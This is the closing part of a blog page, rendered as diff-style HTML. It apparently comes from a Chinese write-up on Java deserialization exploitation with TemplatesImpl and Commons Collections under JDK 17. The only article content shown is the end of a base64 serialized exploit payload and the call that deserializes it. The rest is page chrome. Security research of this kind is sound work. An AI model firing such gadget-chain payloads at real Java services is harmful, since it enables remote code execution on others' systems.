AdVc2VsZXNzBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAxVc2VsZXNzLmphdmEBAAY8aW5pdD4BAAMoKVYMAAcACAoABAAJAQAEQ29kZQAhAAIABAAAAAAAAQABAAcACAABAAsAAAARAAEAAQAAAAUqtwAKsQAAAAAAAQAFAAAAAgAGcHQACHVzZWxlc3MxcHcBAHh1cQB+ABsAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3BweA==&quot;</span>;</span><br><span class="line">        SerializeUtil.deserializeFromBase64(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> </li>
+        <li><strong>Author:</strong> exp3n5ive</li>
+        <li><strong>Created at
+                :</strong> 2025-09-12 15:00:50</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-09-12 15:00:30
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://exp3n5ive.github.io/2025/09/12/Jdk17&amp;CC 下利用 TemplesImpl/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/09/12/hello-world/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Hello World</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title"></div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsafe-%E7%B1%BB"><span class="nav-text">Unsafe 类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%A8%A1%E5%9D%97%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86"><span class="nav-text">绕过模块检测原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jdk17-%E4%B8%8B%E4%BD%BF%E7%94%A8-TemplesImpl-%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-text">Jdk17 下使用 TemplesImpl 的限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF-AbstractTranslet-%E9%97%AE%E9%A2%98"><span class="nav-text">继承 AbstractTranslet 问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E6%A8%A1%E5%9D%97%E6%A3%80%E6%B5%8B%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">反序列化时模块检测的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0-Transformer-%E6%95%B0%E7%BB%84"><span class="nav-text">构造 Transformer 数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%BB%95%E8%BF%87-newInstance"><span class="nav-text">分析绕过 newInstance</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E7%BB%88-POC"><span class="nav-text">最终 POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text">补充</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">exp3n5ive</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        2 posts in total
+                    </span>
+                    
+                        <span>
+                            7.4k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
